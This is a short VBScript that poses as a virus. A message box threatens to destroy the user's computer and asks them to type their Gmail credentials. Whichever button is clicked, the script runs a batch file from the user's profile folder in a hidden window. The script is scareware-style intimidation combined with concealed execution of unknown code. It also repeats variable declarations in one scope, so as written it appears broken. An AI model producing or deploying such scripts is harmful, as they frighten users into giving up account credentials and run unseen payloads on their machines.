Dim answer
answer = MsgBox("This is a virus type the crendetials of your gmail account or else I will destroy your compute!!! Will you write the credentials??", vbYesNo, "Confirmation")
If answer = vbYes Then
    ' Code to execute if user selects Yes
    MsgBox "You chose Yes!"
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")

    ' Get the user profile path
    Dim userProfile
    userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

    ' Launch the batch script
    objShell.Run userProfile & "\2.bat", 0, True

Else
    ' Code to execute if user selects No
    MsgBox "You chose No!"
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")

    ' Get the user profile path
    Dim userProfile
    userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

    ' Launch the batch script
    objShell.Run userProfile & "\3.bat", 0, True


End If